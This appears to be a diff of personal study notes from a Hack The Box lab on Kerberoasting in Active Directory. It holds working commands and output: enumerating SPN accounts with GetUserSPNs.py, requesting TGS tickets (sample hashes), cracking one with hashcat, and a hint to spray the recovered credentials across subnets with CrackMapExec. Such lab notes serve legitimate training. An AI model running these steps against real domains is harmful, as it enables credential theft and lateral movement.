@@ -2,27 +2,25 @@
 
 
 
-**Kerberoasting - Performing the Attack**
+## Kerberoasting - Performing the Attack
 
 **Depending on your position in a network, this attack can be performed in multiple ways:**
 
-- From a non-domain joined Linux host using valid domain user credentials.
-- From a domain-joined Linux host as root after retrieving the keytab file.
-- From a domain-joined Windows host authenticated as a domain user.
-- From a domain-joined Windows host with a shell in the context of a domain account.
-- As SYSTEM on a domain-joined Windows host.
-- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
+1. From a non-domain joined Linux host using valid domain user credentials.
+2. From a domain-joined Linux host as root after retrieving the keytab file.
+3. From a domain-joined Windows host authenticated as a domain user.
+4. From a domain-joined Windows host with a shell in the context of a domain account.
+5. As SYSTEM on a domain-joined Windows host.
+6. From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
 
-**Several tools can be utilized to perform the attack:**
+### Several tools can be utilized to perform the attack:
 
-- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
-- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
-- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
+1. Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
+2. A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+3. From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
 
-**Kerberoasting with GetUserSPNs.py**
-**Listing SPN Accounts with GetUserSPNs.py**
-    
-    ```powershell
+### Kerberoasting with GetUserSPNs.py
+### Listing SPN Accounts with GetUserSPNs.py
     Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
     Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
     
@@ -36,9 +34,9 @@
     MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
     MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
     adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
-    ```
     
-**Requesting all TGS Tickets**
+    
+#### Requesting all TGS Tickets
         
         Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
         
@@ -57,7 +55,7 @@
         $krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445c
       
         
-  **Requesting a Single TGS ticket**
+  #### Requesting a Single TGS ticket
         
     
         Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
@@ -76,7 +74,7 @@
         >To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
         
     
-  **Cracking the Ticket Offline with Hashcat**
+  #### Cracking the Ticket Offline with Hashcat
     
     Foresty@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting...
     
@@ -98,8 +96,6 @@
     Stopped: Tue Feb 15 17:45:41 2022
   
     
-  **USING THE CREDS
-    
-    ~~~bash
+  #### USING THE CREDS
     IF YOU DIDNT KNOW WHAT CREDS ITS INDICATED, YOU CAN USE CRACKMAPEXEC TO PERFORM CHECK ON ALL SUBNETTING IP /24 OR /16
-    ~~~
+    
